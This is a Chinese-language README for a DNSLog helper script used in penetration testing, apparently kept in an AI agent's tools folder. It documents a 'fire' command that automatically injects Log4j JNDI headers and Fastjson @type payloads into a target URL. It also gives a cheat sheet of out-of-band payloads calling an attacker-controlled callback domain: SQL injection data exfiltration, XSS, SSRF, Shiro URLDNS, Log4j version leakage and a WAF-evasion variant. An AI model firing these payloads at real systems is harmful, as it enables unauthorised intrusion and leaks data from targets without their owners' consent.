# DNSLog 一键工具

常驻可复用的 DNSLog，以后渗透需要外带/盲注/无回显确认时直接用。

## 快速开始
```bash
cd D:\Desktop\Claude\tools\dnslog_helper

python dnslog.py get                  # 拿新域名: xxx.dnslog.cn
python dnslog.py probe --type fastjson --watch 600   # ★一条命令: 拿域+构造payload+自动盯回连
python dnslog.py fire --type log4j --target http://目标/  # ★主动注入: 自动把${jndi} Header发到目标并盯回连
python dnslog.py poll                 # 查该域回连记录
python dnslog.py watch --timeout 120  # 拿域并轮询, 有回连自动打印
python dnslog.py list                 # 历史
python dnslog.py clear                # 清空
```

## probe 一条命令闭环（探测时推荐）
```
# 生成地址 + 自动构造对应场景 payload + 自动轮询等回连
python dnslog.py probe --type fastjson   # {"@type":"java.net.Inet4Address","val":"<域>"}
python dnslog.py probe --type fastjson6  # Inet6Address 变体
python dnslog.py probe --type log4j      # ${jndi:ldap://<域>} / ${jndi:dns://<域>}
python dnslog.py probe --type log4jver   # ${jndi:ldap://${sys:java.version}.<域>} 带版本
python dnslog.py probe --type shiro      # ysoserial URLDNS 生成指引
python dnslog.py probe --type sqli       # load_file 外带
python dnslog.py probe --type ping/ssrf/xss
python dnslog.py probe --type log4j --watch 0   # 只构造不盯, 后续手动 watch
```
流程: `probe 拿域+payload → 把 payload 发目标(Burp/浏览器) → probe 自动收回连报目标IP`

## fire 主动注入（一条命令打目标）
```
# log4j: 自动 GET 目标 + Header 带 ${jndi:ldap://<域>} (X-Api-Version/X-Forwarded-For/Referer) + 盯回连
python dnslog.py fire --type log4j --target http://目标/ --watch 60

# fastjson: 自动 POST JSON(模板里 {D} 为 payload 占位) + 盯回连
python dnslog.py fire --type fastjson --target http://目标/api --data '{"username":"{D}","password":"x"}' --watch 60
python dnslog.py fire --type fastjson6 --target http://目标/api --data '{"k":"{D}"}'   # Inet6Address 变体

# --watch 0 = 只注入不盯, 稍后 python dnslog.py poll 查
```
注意: fastjson 需人工确认 JSON 接口与注入字段(哪些参数进反序列化), log4j 任意入口自动带即可。

## 两个后端
| 后端 | 用法 | 场景 |
|------|------|------|
| **dnslog.cn** (默认) | `get` 自动拿域+自动轮询 | 免费免注册，通用外带 |
| **Burp Collaborator** | `get --backend collab` + MCP | Shiro key 爆破 / 需要目标IP证据 |

## 实战用法（外带 payload 里填，<子域> = get 拿到的）
```
SQLi:   load_file(concat('\\\\',(select version()),'.<子域>\\x'))  /  ping <子域>
XSS:    <script src=//<子域>>
SSRF:   http://<子域>:80
盲注:   DNSLog 布尔判断
Shiro:  ysoserial URLDNS "http://<子域>" → AES加密 → rememberMe
Fastjson: {"@type":"java.net.Inet4Address","val":"<子域>"}  → 回连=确认@type
         {"@type":"java.net.Inet6Address","val":"<子域>"}
Log4j:  ${jndi:ldap://<子域>}  /  ${jndi:dns://<子域>}       → 回连=确认
        ${jndi:ldap://${sys:java.version}.<子域>}            → 顺带带版本
        WAF变体: ${::-j}${::-n}${::-d}${::-i}:ldap://<子域>}
RCE:    ping <子域> / nslookup <子域>
```

## 原理
- dnslog.cn 每次 `getdomain` 给你一个**随机子域**，该域的任何 A/AAAA/CNAME 解析都被记录
- `getrecords` 返回该 session 的所有解析（域名 + 触发 IP + 时间）
- 目标触发解析 → 回连记录里的 **IP 就是目标出口 IP** → 可作证据
- 每 key 爆破用独立子域（JVM DNS 缓存会吞二次解析）

## 注意
- dnslog.cn 是公共平台，解析记录可能与其他测试者共享 —— 以**目标 IP 出现在记录里**为准
- Collaborator 回连含完整交互（HTTP/SMTP 等），需要证据时用它
